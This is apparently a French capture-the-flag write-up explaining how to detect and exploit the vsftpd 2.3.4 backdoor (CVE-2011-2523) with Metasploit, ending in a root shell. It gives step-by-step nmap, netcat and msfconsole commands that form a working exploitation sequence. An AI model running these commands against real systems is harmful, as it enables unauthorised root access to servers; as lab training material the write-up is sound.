# Challenge 5: CVE Exploitation avec Metasploit - Writeup

## Analyse du challenge

Le serveur FTP utilise vsftpd version 2.3.4, qui contient un backdoor connu (CVE-2011-2523). Ce backdoor permet d'obtenir un shell root en se connectant avec un nom d'utilisateur spécifique.

## Détection de la vulnérabilité

### Étape 1: Identifier le service et la version

```bash
nmap -sV  <target_ip>
```

Ou avec netcat:

```bash
nc <target_ip> 21
```

La réponse devrait indiquer "vsFTPd 2.3.4".

### Étape 2: Rechercher la CVE

La version 2.3.4 de vsftpd contient un backdoor introduit dans le code source. La CVE-2011-2523 permet l'exécution de commandes arbitraires.

## Exploitation avec Metasploit

### Méthode 1: Exploitation directe avec Metasploit

#### Étape 1: Lancer Metasploit

```bash
msfconsole
```

#### Étape 2: Charger le module d'exploitation

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

#### Étape 3: Configurer les options

```bash
set RHOSTS <target_ip>
set RPORT 21
```

#### Étape 4: Lancer l'exploitation

```bash
exploit
```

Si l'exploitation réussit, vous obtiendrez un shell root.

